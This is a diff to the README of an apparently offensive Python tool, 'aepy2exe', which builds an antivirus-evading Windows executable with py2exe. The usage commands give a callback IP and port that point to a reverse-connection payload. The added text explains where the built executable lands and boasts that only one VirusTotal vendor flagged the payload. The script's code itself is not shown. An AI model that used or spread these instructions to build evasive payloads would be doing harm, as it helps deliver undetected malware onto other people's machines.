@@ -15,7 +15,9 @@ Simple python script to evade antiviruses on fully patched and updated Windows e
 2. [Install Py2exe 32 bits for Python 2.7](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download)
 
 ## Usage:
-`python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443`
+``
+python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443
+``
 
 ``` C:\>python aepy2exe.py -h
                                 Antivirus Evasion Py2exe
@@ -41,8 +43,17 @@ Example:
         C:\>python aepy2exe.py -e py2exe -ip <ip_address> -p <port>
         C:\>python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443 
 ```
+``
+The script will generate CyberY.py, build, and dist, Our execution file will be under dist.
+``
+![Output]()
 
+In case there is an error such as The system cannot open the device or file specified.
+Try hard!
 # Conclusion
 Keep in mind that attempting antivirus bypass is a game. Whenever a new evasion technique gets popular, antivirus vendors will eventually learn about itand update their signatures database to block it. Then, new evasion techniques will a rise, which will make vendors to add it to their signature database, and so on.
 
 By the time of this writing, the payload was flagged as malicious by only one vendor on Virus Total.
+
+![virus_total]()
+
